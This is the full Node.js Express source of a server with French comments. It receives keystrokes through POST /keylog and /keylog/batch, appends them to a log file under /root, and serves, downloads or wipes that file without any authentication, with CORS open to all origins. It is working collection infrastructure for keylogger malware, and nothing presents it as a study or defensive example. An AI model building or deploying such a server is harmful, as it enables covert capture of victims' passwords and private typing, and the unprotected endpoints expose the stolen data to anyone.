const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = process.env.KEYLOG_PATH || '/root/keylog.txt';

// Middleware CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    if (req.method === 'OPTIONS') {
        res.sendStatus(204);
    } else {
        next();
    }
});

app.use(express.json());

// Logger middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// POST /keylog : enregistre une touche
app.post('/keylog', (req, res, next) => {
    try {
        const { key } = req.body;
        if (!key) {
            return res.status(400).json({ error: 'Aucune touche reçue.' });
        }
        fs.appendFile(LOG_FILE, key + '\n', (err) => {
            if (err) return next(err);
            res.status(200).json({ message: 'Touche enregistrée.' });
        });
    } catch (error) {
        next(error);
    }
});

// POST /keylog/batch : enregistre un tableau de touches
app.post('/keylog/batch', (req, res, next) => {
    try {
        const { keys } = req.body;
        if (!Array.isArray(keys) || keys.length === 0) {
            return res.status(400).json({ error: 'Aucune touche reçue.' });
        }
        fs.appendFile(LOG_FILE, keys.join('\n') + '\n', (err) => {
            if (err) return next(err);
            res.status(200).json({ message: 'Touches enregistrées.' });
        });
    } catch (error) {
        next(error);
    }
});

// GET /keylog : lit le fichier de log
app.get('/keylog', (req, res, next) => {
    fs.readFile(LOG_FILE, 'utf8', (err, data) => {
        if (err) return next(err);
        res.type('text/plain').send(data);
    });
});

// DELETE /keylog : efface le fichier de log
app.delete('/keylog', (req, res, next) => {
    fs.writeFile(LOG_FILE, '', (err) => {
        if (err) return next(err);
        res.status(200).json({ message: 'Fichier vidé.' });
    });
});

// GET /download : télécharge le fichier de log principal
app.get('/download', (req, res, next) => {
    res.download(LOG_FILE, 'keylog.txt', (err) => {
        if (err) return next(err);
    });
});

// GET /health : monitoring simple
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'ok', time: new Date().toISOString() });
});

// Gestion centralisée des erreurs
app.use((err, req, res, next) => {
    console.error('Erreur serveur :', err);
    res.status(500).json({ error: 'Erreur serveur.', details: err.message });
});

app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
    console.log(`Fichier de log : ${LOG_FILE}`);
});

